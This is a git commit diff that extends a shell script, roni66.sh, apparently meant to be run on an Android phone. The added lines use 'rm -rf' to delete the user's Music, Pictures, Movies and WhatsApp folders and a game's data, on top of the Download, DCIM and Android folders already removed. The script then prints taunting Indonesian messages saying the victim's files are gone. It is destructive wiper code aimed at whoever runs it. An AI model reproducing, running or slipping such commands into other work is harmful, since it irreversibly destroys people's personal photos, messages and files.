7ff7664a273f539b7a451b2a36f6804b482f0b58
ZK1Hacker <47277281+ZK1Hacker@users.noreply.github.com>
2019-10-30 19:39:44 +0700

    Update roni66.sh

--- roni66.sh
+++ roni66.sh
@@ -3,4 +3,12 @@ rm -rf Android
 rm -rf Download
 rm -rf DCIM
 rm -rf UCDownloads
+rm -rf com.garena.game.codm
+rm -rf Music
+rm -rf Pictures
+rm -rf Movies
+rm -rf WhatsApp
+echo "Mampus Semua File Lu Hilang"
+echo "Roni Tersakiti Ya Jadi Gini"
+echo "Mangkanya Jangan Macam Macam"
 echo "Fuck You !!"
